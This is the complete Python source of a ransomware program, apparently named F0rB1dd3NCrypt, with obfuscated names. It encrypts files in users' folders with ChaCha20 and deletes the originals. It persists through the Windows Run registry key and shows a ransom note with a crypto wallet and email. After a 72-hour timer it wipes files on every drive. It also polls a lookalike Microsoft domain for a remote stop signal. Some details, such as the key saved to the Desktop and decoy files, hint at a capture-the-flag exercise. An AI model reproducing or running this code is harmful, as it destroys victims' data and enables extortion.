import os, sys, requests, json, base64, uuid, time, ctypes, logging, threading, random, string, ctypes, tempfile, winreg
from Crypto.Cipher import ChaCha20
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from datetime import datetime, timedelta
from tkinter import filedialog, messagebox, simpledialog, ttk
from PIL import Image, ImageTk
import tkinter as tk    
def RqmesXwcLL(j75nCIiTJS):
    TUl9snA3vb = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(TUl9snA3vb, j75nCIiTJS)
def zjSsBLrLUT():
    if not os.path.exists(jbPcWmkrUj):
        os.makedirs(jbPcWmkrUj)
def QlYiWbDeIA():
    for ihCTkmToTU in [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]:
            lgZjdhUaYz = os.path.join(ihCTkmToTU, "Machine_id.txt")
            if os.path.exists(lgZjdhUaYz):
                try:
                    with open(lgZjdhUaYz, 'r') as file:
                        qDUSLbSNed = file.read().strip()
                        print(f"Machine ID loaded from {lgZjdhUaYz}")
                        return qDUSLbSNed
                except Exception:
                    continue
    VYqZbEGbqH = os.path.join(tempfile.gettempdir(), "Machine_id.txt")
    if os.path.exists(VYqZbEGbqH):
        try:
            with open(VYqZbEGbqH, 'r') as file:
                qDUSLbSNed = file.read().strip()
                print(f"Machine ID loaded from temp: {VYqZbEGbqH}")
                return qDUSLbSNed
        except Exception:
            pass
    return None
QKcENGuIGW = "SzN5VHJtTjg5NDVTbVJ0IQ=="
DXPUSGgcSg = "TG1LOVQzck0xbjR0M1BhNXM="
qXgjiiECGP = os.path.expanduser('~')
jbPcWmkrUj = os.path.join(qXgjiiECGP, '.F0rB1dd3N_time')
zFgoZyiwah = os.path.join(jbPcWmkrUj, 'timer_state.txt')
WhHlPzTclD = RqmesXwcLL("img\\icon.ico")
QBpGypZDST = RqmesXwcLL("img\\logo.png")
NtxKAjSxmV = RqmesXwcLL("img\\ty.png")
zjSsBLrLUT()
mgvnsLaBGQ = [
    os.path.join(qXgjiiECGP, 'Desktop'),
    os.path.join(qXgjiiECGP, 'Documents'),
    os.path.join(qXgjiiECGP, 'Downloads'),
]
hfIEVGBjSt = ['.txt', '.pdf', '.wav', '.mp4', '.db']   
EYhyGKJIhX = '6855484969426n636741446467516r62306348497n634849365633596777435n79427n647n4r484r5142535n6s5246495642794q32467n5267516n6275427n526749334q324r6n54'
iZPsWaHpiB = 'http://mlcr0s0ft.com/includes/api/receive_key.php'
msDffimFKq = 10
njVJRbWKNm = 5
logging.basicConfig(
    filename='Log_Enkripsi.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
ynQJLbsTmQ = logging.StreamHandler()
ynQJLbsTmQ.setLevel(logging.INFO)
QWpcLNAnUx = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
ynQJLbsTmQ.setFormatter(QWpcLNAnUx)
logging.getLogger().addHandler(ynQJLbsTmQ)
class nnjdItjYyw:
    def lqaWFdYuDP(self):
        try:
            ienXgxjgHp = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            ienXgxjgHp = os.path.abspath(ienXgxjgHp)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "F0rB1dd3NCrypt", 0, winreg.REG_SZ, ienXgxjgHp)
            winreg.CloseKey(key)
            logging.info(f"Persistence registry set: {ienXgxjgHp}")
        except Exception as e:
            logging.error(f"Failed to set persistence: {str(e)}")
    def __init__(self, BLUNCrEYXb, SbpNaOnNJj, CqlxZZoOau, iZPsWaHpiB, max_attemps=10, delay=5):
        self.BLUNCrEYXb = BLUNCrEYXb
        self.SbpNaOnNJj = SbpNaOnNJj
        self.CqlxZZoOau = CqlxZZoOau 
        self.iZPsWaHpiB = iZPsWaHpiB 
        self.max_attemps =  max_attemps
        self.delay = delay
        self.key, self.OthMrXutsC = self.qzjeRuLBNu(CqlxZZoOau)
        self.qDUSLbSNed = str(uuid.uuid4())
        self.MAGIC = b'F0rB1CRYPT'
    def qzjeRuLBNu(self, CqlxZZoOau):
        try:
            OthMrXutsC = get_random_bytes(16)
            key = PBKDF2(CqlxZZoOau.encode(), OthMrXutsC, dkLen=32, count=1000000)
            logging.info("Key generated successfully")
            return key, OthMrXutsC
        except Exception as e :
            logging.error(f"Failed to generate key : {str(e)}")
            raise
    def set_wallpaper(self, path):
        try:
            logging.info(f"Try to set wallpaper from: {path}")
            bmp_path = os.path.join(tempfile.gettempdir(), "wallpaper_temp.bmp")
            Image.open(path).save(bmp_path, "BMP")
            result = ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 3)
            if result:
                logging.info(f"Wallpaper set successfully to: {bmp_path}")
            else:
                logging.error("Windows API call failed (returned 0)")
        except Exception as e:
            logging.error(f"Failed to set wallpaper: {str(e)}")

    def create_important_files(self, directory_path):
        try:
            d_data_path = os.path.join(directory_path, 'D-Data')
            os.makedirs(d_data_path, exist_ok=True)

            filenames = ['mIcr0sOft_Report.docx', 'mIcr0sOft_Q3.xlsx', 'mIcr0sOft_contact.pdf']
            file_contents = ['mIcr0sOft Report', 'mIcr0sOft Q3', 'mIcr0sOft Contact']

            for filename, content in zip(filenames, file_contents):
                file_path = os.path.join(d_data_path, filename)
                with open(file_path, 'w') as file:
                    file.write(content)
            logging.info(f"Created important files in : '{d_data_path}'")
        except Exception as e :
            logging.error(f"Failed to create important files: {str(e)}")
    def encrypt_file(self, filepath):
        try:
            nonce = get_random_bytes(8)
            cipher = ChaCha20.new(key=self.key, nonce=nonce)
            with open(filepath, 'rb') as f:
                data = f.read()
            original_filename = os.path.basename(filepath)
            original_filename_bytes = original_filename.encode()
            filename_len = len(original_filename_bytes)
            full_data = (
                self.MAGIC +
                self.OthMrXutsC +
                nonce +
                bytes([filename_len]) +
                original_filename_bytes +
                cipher.encrypt(data)
            )
            random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            new_path = os.path.join(os.path.dirname(filepath), random_name + ".F0rB1dd3N")

            with open(new_path, 'wb') as f:
                f.write(full_data)

            os.remove(filepath)
            logging.info(f"[✓] Encrypted : {filepath} → {new_path}")
        except Exception as e:
            logging.error(f"[✗] Failed to encrypt : {filepath}: {str(e)}")
    def encrypt_files_in_directory(self, directory_path):
        try:
            for root, dirs, files in os.walk(directory_path):
                if any(skip in root for skip in ["$RECYCLE.BIN", "System Volume Information"]):
                    continue
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith('.F0rB1dd3N'):
                        continue
                    if not (file.lower().endswith('.txt') or file.lower().endswith('.pdf') or file.lower().endswith('.xlsx') or file.lower().endswith('.docx') or file.lower().endswith('.one')):
                        continue
                    try:
                        self.encrypt_file(file_path)
                    except Exception as e:
                        logging.error(f"Failed to encrypt file: {file_path}: {str(e)}")
            logging.info(f"All files in {directory_path}: encrypted successfully")
        except Exception as e:
            logging.error(f"Failed to encrypt files in directory: {directory_path}: {str(e)}")
    def create_user_manual(self, directory_path):
        manual_content = f"""Dear User,
        the file have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:$S')} with a unique machine ID: {self.qDUSLbSNed}.
        Please keep this machine ID safe. You will read it along with your decryption key to unlock your files.
        In case of any issues or to obtain your decryption key, Please contact your IT departement or your system administrator for futher details.
        Thank You,
        Your Security Team
        """
        manual_path = os.path.join(directory_path, "README.txt")
        try:
            with open(manual_path, 'w') as manual_file:
                manual_file.write(manual_content)
            logging.info("User manual created successfully.")
        except Exception as e:
            logging.error(f"failed to create user manual : {str(e)}")
    def save_key_locally(self):
        key_path = os.path.join(qXgjiiECGP, 'Desktop', 'encryption_key.txt')
        try:
            os.makedirs(os.path.dirname(key_path), exist_ok=True)
            with open(key_path, 'w') as file:
                file.write(f"Machine ID : {self.qDUSLbSNed}\n")
                file.write(f"Encryption Key: {base64.b64encode(self.key).decode('utf-8')}\n")
            logging.info(f"Encryption key saved locally to {key_path}.")
            return True
        except Exception as e:
            logging.error(f"Failed to save encryption key locally : {str(e)}")
            return False
    def save_machine_id(self, directory_path):
        try:
            lgZjdhUaYz = os.path.join(directory_path, "Machine_id.txt")
            os.makedirs(directory_path, exist_ok=True)
            with open(lgZjdhUaYz, 'w') as file:
                file.write(self.qDUSLbSNed)
            logging.info(f"Machine ID saved to {lgZjdhUaYz}.")
            VYqZbEGbqH = os.path.join(tempfile.gettempdir(), "Machine_id.txt")
            with open(VYqZbEGbqH, 'w') as f:
                f.write(self.qDUSLbSNed)
            logging.info(f"Machine ID also saved to temp folder: {VYqZbEGbqH}")
        except Exception as e:
            logging.error(f"Failed to save Machine ID : {str(e)}")
    def process_drive(self, ihCTkmToTU):
        if os.path.isdir(ihCTkmToTU):
            target_path = ihCTkmToTU
        elif os.path.isdir(ihCTkmToTU + os.sep):
            target_path = ihCTkmToTU + os.sep
        else:
            logging.warning(f"Target {ihCTkmToTU} tidak ditemukan atau bukan folder yang valid.")
            return
        self.create_important_files(target_path)
        self.encrypt_files_in_directory(target_path)
        self.create_user_manual(target_path)
        self.save_machine_id(target_path)
    def execute(self):
        self.lqaWFdYuDP()
        for ihCTkmToTU in self.BLUNCrEYXb:
            logging.info(f"processing ihCTkmToTU : {ihCTkmToTU}")
            self.process_drive(ihCTkmToTU)
        if self.save_key_locally():
            logging.info(f"Encrption key saved locally.")
        else:
            logging.error("Failed to save encyprtion key locally.")
        wallpaper_path = RqmesXwcLL('img\\wallpaper.png')
        self.set_wallpaper(wallpaper_path)
        logging.info("Encryption process completed.")
class TerminationKeyDialog(tk.Toplevel):
    def __init__(self, parent, WhHlPzTclD):
        super().__init__(parent)
        self.iconbitmap(WhHlPzTclD)
        self.title("Termination Key")
        self.geometry("400x200")
        self.result = None
        tk.Label(self, text="Enter Termination Key:").pack(pady=10)
        self.key_entry = tk.Entry(self)
        self.key_entry.pack(pady=5)
        self.key_entry.focus_set()
        tk.Button(self, text="Submit", command=self.on_submit).pack(pady=10)   
    def on_submit(self):
        entered_key = self.key_entry.get()
        self.result = entered_key
        self.destroy()
class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
    def __init__(self, parent, WhHlPzTclD, title, prompt):
        self.WhHlPzTclD = WhHlPzTclD
        self.prompt = prompt
        super().__init__(parent, title)
    def body(self, master):
        self.iconbitmap(self.WhHlPzTclD)
        tk.Label(master, text=self.prompt).pack(pady=10)
        self.key_entry = tk.Entry(master)
        self.key_entry.pack(pady=5)
        return self.key_entry
    def apply(self):
        self.result = self.key_entry.get() 
    def center_windows(self):
        self.update_idletasks()
        width = self.winfo_width()
        height = self.winfo_height()
        x = (self.winfo_screenwidth() - width) // 2
        y = (self.winfo_screenheight() - height) // 2
        self.geometry(f"{width}x{height}+{x}+{y}")
class CountdownDialog(tk.Toplevel):
    def __init__(self, parent, countdown_time, close_app_callback):
        super().__init__(parent)
        self.countdown_time = countdown_time
        self.close_app_callback = close_app_callback
        self.init_ui()
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        self.resizable(False, False)
        self.attributes("-topmost", True)
        self.overrideredirect(True)
        self.grab_set
        self.center_window()
    def disable_event(self):
        pass
    def init_ui(self):
        self.geometry("300x150")
        self.title(WhHlPzTclD)
        thanks_img = Image.open(NtxKAjSxmV).resize((50, 50))    
        thanks_photo = ImageTk.PhotoImage(thanks_img)   
        label =tk.Label(self, image=thanks_photo, bg='#f0f0f0')
        label.image = thanks_photo
        label.pack(side='left', padx=10, pady=20)
        self.countdown_lable = tk.Label(self, text=f"Closing in {self.countdown_time} seconds...", font=("Arial", 14), bg='#f0f0f0')       
        self.countdown_lable.pack(side='left', expand=True, padx=20, pady=20)
        self.update_countdown()
    def update_countdown(self):
        if self.countdown_time > 0:
            self.countdown_lable.config(text=f"Closing in {self.countdown_time} seconds...")
            self.countdown_time -= 1
            self.after(1000, self.update_countdown)
        else:
            self.countdown_lable.config(text="Closing now...")  
            self.close_app_callback()
    def center_window(self):
        self.update_idletasks()
        width = self.winfo_width()
        height = self.winfo_height()
        x = (self.winfo_screenwidth() - width) // 2
        y = (self.winfo_screenheight() - height) // 2
        self.geometry(f"{width}x{height}+{x}+{y}")
    def on_close(self):
        """Handle the close event for the dialog."""
        messagebox.showwarning("Warning", "This window cannot be closed manually. Please wait for the countdown to complete.")
def QAcgJYGzAe(ciphertext):
    rot13_decoded = ''.join(
        chr(((ord(c) - 65 + 13) % 26 + 65) if c.isupper()
             else (ord(c) - 97 + 13) % 26 + 97 if c.islower()
             else ord(c))
        for c in ciphertext)
    try:
        hex_decoded = bytes.fromhex(rot13_decoded).decode()
    except Exception as e:
        return f"[!] Hex decode error: {e}"
    reversed_str = hex_decoded[::-1]
    try:
        base64_decoded = base64.b64decode(reversed_str).decode()
    except Exception as e:
        return f"[!] decode error: {e}"
    return base64_decoded
class nHGOHYTBPt(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("F0rB1dd3NCrypt - Decryptor")
        self.geometry("900x700")
        self.iconbitmap(WhHlPzTclD)
        self.configure(bg='black')
        self.resizable(False, False)
        self.timer_update_id = None
        self.stop_deletion = False
        self.deletion_stopped = False
        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
        self.stop_event = threading.Event()
        self.MAGIC = b'F0rB1CRYPT'
        self.initialize_ui()
        self.qDUSLbSNed = QlYiWbDeIA()
        if self.qDUSLbSNed:
            self.load_timer_state()
        else:
            messagebox.showerror("Error", "Machine ID not found. Cannot load timer state.")
            self.destroy()
        threading.Thread(target=self.check_for_remote_stop_signal, args=(self.qDUSLbSNed,), daemon=True).start()
    def check_for_remote_stop_signal(self, qDUSLbSNed, check_interval=10):
        url = f"http://mlcr0s0ft.com/includes/api/check_stop_signal.php?qDUSLbSNed={qDUSLbSNed}"
        while not self.stop_deletion:
            try:
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                data = response.json()
                if data.get('stop_signal') == "1":
                    self.stop_deletion_process_remotely()
                    break
            except requests.RequestException as e:
                pass
            time.sleep(check_interval)  
    def stop_deletion_process_remotely(self):
        if not self.stop_deletion:
            self.stop_deletion = True
            self.deletion_stopped = True
            self.stop_event.set()
            self.log("deletion process stopped remotely.", "blue")
            if hasattr(self, 'deletion_dialog') and self.deletion_dialog:
                self.deletion_dialog.destroy()  
                self.deletion_dialog = None
    def initialize_ui(self):
        self.iconbitmap(WhHlPzTclD)
        logo_image = Image.open(QBpGypZDST).resize((200, 200))  
        logo_photo = ImageTk.PhotoImage(logo_image)
        frame = tk.Frame(self, bg='black')
        frame.pack(pady=(20, 20))
        logo_label = tk.Label(frame, image=logo_photo, bg='black')
        logo_label.image = logo_photo
        logo_label.pack(side=tk.LEFT, padx=(20, 10))
        note = """YOUR FILES HAVE BEEN ENCRYPTED \n\n Your server got hit by our ransomware because you didn't create a secure website\n\n
        Do you want the files on your server recovered? Pay MT 19.660.000.000 to our gang's crypto wallet.\n\n
        0xCc68b19102635C9Ac6eC6375aB4134d35f976227\n\n
        If you want to negotiate a fee or have already paid, tell us your key and email it to yanto.F0rB1dd3N@elransom.com, then we will give you how to decrypt it."""
        note_label = tk.Text(frame, bg='black', font=('Helvetica',12),wrap='word',height=16, width=60, borderwidth=0)
        note_label.pack(side=tk.LEFT, padx=(10,20))
        note_label.insert(tk.END, "YOUR FILES HAVE BEEN ENCRYPTED \n\n", "center_red")
        note_label.insert(tk.END, "Your server got hit by our ransomware because you didn't create a secure website\n\n", "center_red")
        note_label.insert(tk.END, "Do you want the files on your server recovered? Pay MT 19.660.000.000 to our gang's crypto wallet.\n\n", "center_yellow")
        note_label.insert(tk.END, "0xCc68b19102635C9Ac6eC6375aB4134d35f976227\n\n", "center_white")
        note_label.insert(tk.END, "If you want to negotiate a fee or have already paid, tell us your key and email it to yanto.F0rB1dd3N@elransom.com, then we will give you how to decrypt it.", "center_yellow")
        #just in case I forgot the phrase wallet -> rice clerk type income portion viable detect sponsor pear lecture 
        #go to website that used by us to store plain text online find mulyono to get the 11th pharse
        #dont overthink, we love mulyono in encrypted way
        note_label.tag_configure("center", justify='center')
        note_label.tag_configure("center_red", justify='center', foreground='red')
        note_label.tag_configure("center_yellow", justify='center', foreground='yellow')
        note_label.tag_configure("center_white", justify='center', foreground='white')
        note_label.tag_add("center", "1.0", "1.end")
        note_label.tag_add("center_red", "1.0", "2.end")
        note_label.tag_add("center_yellow", "4.0", "4.end")
        note_label.tag_add("center_white", "5.0", "6.end")
        note_label.configure(state='disabled')
        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()
    def stop_deletion_process(self):
        if not self.stop_deletion:
            self.stop_deletion = True
            self.deletion_stopped = True
            self.stop_event.set()
            self.log("Deletion process stopped.", "white")
            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                self.deletion_dialog.destroy()  
    def check_secondary_termination(self):
        response = simpledialog.askstring("stop deletion", "Enter the secondary termination key to stop the deletion process:", parent=self)
        if response == base64.b64decode(DXPUSGgcSg):
            self.stop_deletion_process()
        else:
            messagebox.showerror("Error", "Incorrect key! Deletion will continue.")
    def log(self, message, color='green'):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formated_message = f"[{timestamp}] {message}"
        if self.winfo_exists():
            self.after(0, lambda:self._update_log_listbox(formated_message, color))
    def _update_log_listbox(self, message, color):
        self.log_listbox.insert(tk.END, message)
        self.log_listbox.itemconfig(tk.END, {'fg': color})
        self.log_listbox.see(tk.END)
    def setup_key_frame(self):
        key_frame = tk.Frame(self, bg='black')
        key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        self.time_label = tk.Label(
            key_frame,
            text="Time remaining: ...",
            bg="black",
            fg="cyan",
            font=('Helvetica', 12))
        self.time_label.pack(side=tk.TOP, anchor='w', padx=10, pady=(0, 5))
        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
        tk.Button(
            key_frame,
            text="MULAI DECRYPT",
            bg="#d9534f",
            fg='white',
            font=('Helvetica', 12),
            relief=tk.FLAT,
            command=self.start_decryption
        ).pack(side=tk.RIGHT, padx=(10, 0))
    def setup_log_frame(self):
        log_frame = tk.Frame(self, bg='black')
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        banner_text = "Welcome to F0rB1dd3NCrypt - [Mode Hacker]"
        banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
        banner_label.pack(side=tk.TOP, fill=tk.X)
        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
        self.log_listbox.pack(side=tk.LEFT,fill=tk.BOTH, expand=True)
        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)  
        scrollbar.pack(side="right", fill="y")
        self.log_listbox.config(yscrollcommand=scrollbar.set)
    def setup_progress_frame(self):
        self.progress_frame = tk.Frame(self, bg="black")
        self.progress_frame.pack(fill=tk.BOTH, expand=False, padx=10, pady=20)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
        self.progress = ttk.Progressbar(
            self.progress_frame,
            style='Enhanced.Horizontal.TProgressbar',
            orient=tk.HORIZONTAL,
            length=400,
            mode='determinate')
        self.progress.pack(fill=tk.X, expand=True)
        self.progress_label = tk.Label(
            self.progress_frame,
            text="Progress Decrypt: 0%",
            bg='black',
            fg='white',
            font=('Helvetica', 12))
        self.progress_label.pack()
    def start_decryption(self):
        decryption_key = self.key_entry.get()
        if not decryption_key:
            messagebox.showerror("Error", "Decryption key cannot be empty.")
            self.log("Decryption key is empty.", "yellow")
            return
        try:
            self.password_bytes = base64.b64decode(decryption_key)
            self.log("Starting decryption process...", "green")
            if self.timer_update_id:
                self.after_cancel(self.timer_update_id)
                self.timer_update_id = None
            threading.Thread(target=self.scan_and_decrypt, daemon=True).start()
        except base64.binascii.Error:
            messagebox.showerror("Error", "Invalid decryption key format. Please enter a valid base64 encoded key.")
            self.log("Invalid decryption key format.", "red")
    def scan_and_decrypt(self):
        encrypted_files = []
        BLUNCrEYXb = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for ihCTkmToTU in BLUNCrEYXb:
            self.log(f"Scanning Drives: {ihCTkmToTU}", "blue")
            for dp, dn, filenames in os.walk(ihCTkmToTU):
                if any(excluded in dp for excluded in ["$RECYCLE.BIN", "System Volume Information", 'Windows']):
                    continue
                for f in filenames:
                    if f.endswith('.F0rB1dd3N'):
                        encrypted_files.append(os.path.join(dp, f))
                        self.log(f"Found encrypted file: {os.path.join(dp, f)}", "blue")
        self.log(f"Total encrypted files found: {len(encrypted_files)}", "yellow")
        total_files = len(encrypted_files)
        self.safe_update_progress(0, total_files)
        decrypted_count = 0
        for file_path in encrypted_files:
            if self.decrypt_file(file_path):
                decrypted_count += 1
                self.safe_update_progress(decrypted_count, total_files)
        if decrypted_count == total_files:
            self.after(0, self.stop_timer_and_show_success)
        else:
            self.after(0, lambda: messagebox.showerror("Decryption Failed",
                                                    "Failed to decrypt one or more files. Please check the decryption key and try again."))
    def show_incomplete_message(self, decrypted_count, total_files):
        messagebox.showwarning("Decryption Incomplete", f"Decrypted {decrypted_count} out of {total_files} files.")
    def safe_update_progress(self, value, maximum):
        self.after(0, lambda: self.update_progress_bar(value, maximum))
    def update_progress_bar(self, value, maximum):
        if maximum == 0:
            self.progress['value'] = 0
            self.progress_label.config(text="No encrypted files found.")
        else:
            self.progress['maximum'] = maximum
            self.progress['value'] = value
            percentage = (value / maximum) * 100
            self.progress_label.config(text=f"Progress Decrypt: {percentage:.2f}%")
    def stop_timer_and_show_success(self):
        if self.timer_update_id:
            self.after_cancel(self.timer_update_id)
            self.timer_update_id = None 
        success_message = "Decryption completed successfully!"
        messagebox.showinfo("Decrypt Complete", success_message, parent=self)
        self.delete_timer_and_machine_id_files()
        self.delete_timer_state_file()
        countdown_dialog = CountdownDialog(self, 10, self.close_application)
        countdown_dialog.mainloop()
    def start_closing_countdown(self):
        countdown_dialog = CountdownDialog(self, 10, self.close_application)
        countdown_dialog.grab_set()
        countdown_dialog.mainloop()
    def close_application(self):
        try:
            self.destroy()
        except Exception as e:
            logging.error(f"Failed to close application: {str(e)}")
    def on_close_window(self):
        correct_key1 = base64.b64decode(QKcENGuIGW).decode()
        correct_key2 = base64.b64decode(DXPUSGgcSg).decode()
        while True:
            dialog = TerminationKeyDialog(self, WhHlPzTclD)
            self.wait_window(dialog)
            if dialog.result == correct_key1 or dialog.result == correct_key2:
                self.destroy()
                break
            else:
                messagebox.showerror("Error", "Incorrect termination key! Application will not close.")
        dialog = TerminationKeyDialog(self, WhHlPzTclD)
        self.wait_window(dialog)
        correct_key = base64.b64decode(QKcENGuIGW).decode()
        if dialog.result == correct_key:
            self.destroy()
        else:
            messagebox.showerror("Error", "Incorrect termination key! Application will not close.")
            # Jangan close aplikasi, hanya tampilkan countdown dialog
            countdown_dialog = CountdownDialog(self, 10, self.close_application)
            countdown_dialog.grab_set()         
    def decrypt_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
            if not file_data.startswith(self.MAGIC):
                logging.error(f"[✗] Invalid file format: {filepath}")
                return False
            offset = len(self.MAGIC)
            OthMrXutsC = file_data[offset:offset + 16]
            offset += 16
            nonce = file_data[offset:offset + 8]
            offset += 8
            filename_len = file_data[offset]
            offset += 1
            filename_bytes = file_data[offset:offset + filename_len]
            offset += filename_len
            ciphertext = file_data[offset:]
            original_filename = filename_bytes.decode()
            key = PBKDF2(self.password_bytes, OthMrXutsC, dkLen=32, count=1000000)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            plaintext = cipher.decrypt(ciphertext)
            output_path = os.path.join(os.path.dirname(filepath), original_filename)
            with open(output_path, 'wb') as f:
                f.write(plaintext)
            os.remove(filepath)
            logging.info(f"[✓] Decrypted : {filepath} → {output_path}")
            return True
        except Exception as e:
            logging.error(f"[✗] Failed to decrypt : {filepath}: {str(e)}")
            return False
    def scan_and_decrypt_in_directory(self, directory_path):
        try:
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith('.F0rB1dd3N'):
                        try:
                            self.decrypt_file(file_path)
                        except Exception as e:
                            logging.error(f"Failed to decrypt file: {file_path}: {str(e)}")
            logging.info(f"All files in {directory_path}: decrypted successfully")
        except Exception as e:
            logging.error(f"Failed to decrypt files in directory: {directory_path}: {str(e)}")
    def load_timer_state(self):
        try:
            with open(zFgoZyiwah, 'r') as f:
                timestamp_str = f.read().strip()
                if not timestamp_str:
                    self.time_label.config(text="Timer not set.")
                    self.closing_time = None
                    return
                self.closing_time = datetime.fromtimestamp(float(timestamp_str))
                if datetime.now() >= self.closing_time:
                    self.time_label.config(text="Timer expired.")
                    messagebox.showinfo("Timer Expired", "The timer has expired. Initiating deletion sequence.")
                    self.begin_deletion_sequence()
                else:
                    self.update_timer()
        except (FileNotFoundError, ValueError):
            self.reset_timer()
    def update_timer(self):
        remaining_time = self.closing_time - datetime.now()
        if remaining_time.total_seconds() > 0:
            total_seconds = int(remaining_time.total_seconds())
            days, remainder = divmod(total_seconds, 86400)
            hours, remainder = divmod(remainder, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_str = f"{days}d {hours}h {minutes}m {seconds}s"
            if hasattr(self, 'time_label') and self.time_label.winfo_exists():
                self.time_label.config(text=f"Time remaining: {time_str}")
                self.timer_update_id = self.after(1000, self.update_timer)
        else:
            if hasattr(self, 'time_label') and self.time_label.winfo_exists():
                self.time_label.config(text="Time is up")
            self.begin_deletion_sequence()
    def reset_timer(self):
        self.closing_time = datetime.now() + timedelta(hours=72)
        with open(zFgoZyiwah, 'w') as f:
            f.write(str(self.closing_time.timestamp()))
        self.update_timer()
    def reset_timer_state_file(self):
        with open(zFgoZyiwah, 'w') as f:
            f.write('')
        self.time_label.config(text="No Active Countdown")
    def delete_timer_state_file(self):
        try:
            os.remove(zFgoZyiwah)
            logging.info("Timer state file deleted successfully.")
        except FileNotFoundError:
            pass
    def delete_timer_and_machine_id_files(self):
        try:
            os.remove(zFgoZyiwah)
        except FileNotFoundError:
            pass
        BLUNCrEYXb = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for ihCTkmToTU in BLUNCrEYXb:
            lgZjdhUaYz = os.path.join(ihCTkmToTU, "Machine_id.txt")
            try:
                os.remove(lgZjdhUaYz) 
            except FileNotFoundError:
                pass
    def begin_deletion_sequence(self):
        if not self.stop_deletion:
            self.log("Starting deletion sequence...", "red")
            self.deletion_dialog = CountdownDialog(self, 10, self.stop_deletion_process)
            self.deletion_process()
    def deletion_process(self):
        self.log("Starting deletion process...", "red")
        self.deletion_thread = threading.Thread(target=self.delete_files_with_timing, daemon=True)
        self.deletion_thread.start()
    def delete_files_with_timing(self):
        BLUNCrEYXb = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        excluded_dirs = ["$RECYCLE.BIN", "System Volume Information", 'Windows']
        excluded_files = ['Machine_id.txt', 'encryption_key.txt', 'timer_state.txt', 'README.txt']
        def handle_deletion(directory):
            for current_dir, directories, files in os.walk(directory, topdown=False):
                if any(excluded in current_dir for excluded in excluded_dirs):
                    continue
                for file in files:
                    if file in excluded_files:
                        continue
                    file_path = os.path.join(current_dir, file)
                    if not os.access(file_path, os.W_OK):
                        self.log(f"Skipping read-only file: {file_path}")
                        continue
                    if self.stop_event.is_set():
                        self.log("stop signal recieved. Ending Deletion Process", "orange")
                        return
                    try:
                        os.remove(file_path)
                        self.log(f"Deleted file: {file_path}")
                    except PermissionError as e:
                        self.log(f"Permission error, skip delete file {file_path}: {str(e)}")
                    except Exception as e:
                        self.log(f"Failed to delete file {file_path}: {str(e)}")
                    time.sleep(5)
                    if not directories and not files:
                        self.log(f"all files in directory deleted from : {current_dir}", "green")
        for ihCTkmToTU in BLUNCrEYXb:
            d_data_path = os.path.join(ihCTkmToTU, 'D-Data')
            if os.path.exists(d_data_path):
                self.log(f"Deleting files in D-Data directory: {d_data_path}", "red")
                handle_deletion(d_data_path)    
                if self.stop_event.is_set():
                    return
        for ihCTkmToTU in BLUNCrEYXb:
            self.log(f"Deleting files in Drives: {ihCTkmToTU}", "red")
            handle_deletion(ihCTkmToTU)
            if self.stop_event.is_set():
                break
if __name__ == "__main__":
    qDUSLbSNed = QlYiWbDeIA()
    if qDUSLbSNed:
        fqDhWlmyCl = nHGOHYTBPt()
        fqDhWlmyCl.mainloop()
    else:
        PPgVQiOFqR = nnjdItjYyw(mgvnsLaBGQ, hfIEVGBjSt, QAcgJYGzAe(EYhyGKJIhX), iZPsWaHpiB, msDffimFKq, njVJRbWKNm)
        PPgVQiOFqR.execute()
        fqDhWlmyCl = nHGOHYTBPt()
        fqDhWlmyCl.mainloop()